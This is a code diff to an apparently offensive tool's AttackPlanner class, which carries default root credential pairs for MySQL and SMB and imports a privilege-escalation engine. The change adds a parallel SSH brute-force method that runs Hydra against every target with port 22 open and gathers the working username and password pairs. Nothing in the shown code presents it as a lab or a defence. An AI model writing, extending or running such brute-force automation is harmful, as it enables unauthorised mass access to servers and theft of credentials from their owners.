@@ -6,6 +6,7 @@ import os
 import time
 from modules.privesc_engine import PrivescEngine
 from utils.logging_utils import get_logger
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 logger = get_logger(__name__)
 
@@ -31,7 +32,26 @@ class AttackPlanner:
             3306: [('root', ''), ('root', 'root')],
             445: [('root', 'root')],
         }
-
+    def brute_force_parallel(self, targets, max_workers=10):
+        """
+        Parallel SSH brute-force using Hydra on multiple targets.
+        Returns dict {ip: [(user, pass), ...]}.
+        """
+        results = {}
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            future_to_target = {
+                executor.submit(self.brute_force_hydra, target['ip'], 22, 'ssh'): target
+                for target in targets if 22 in target.get('ports', [])
+            }
+            for future in as_completed(future_to_target):
+                target = future_to_target[future]
+                try:
+                    creds = future.result()
+                    if creds:
+                        results[target['ip']] = creds
+                except Exception as e:
+                    logger.error(f"Parallel brute-force failed on {target['ip']}: {e}")
+        return results
     def brute_ssh(self, target, user, password, port=22, retries=2):
         """Try a single credential pair with retries."""
         for attempt in range(retries):
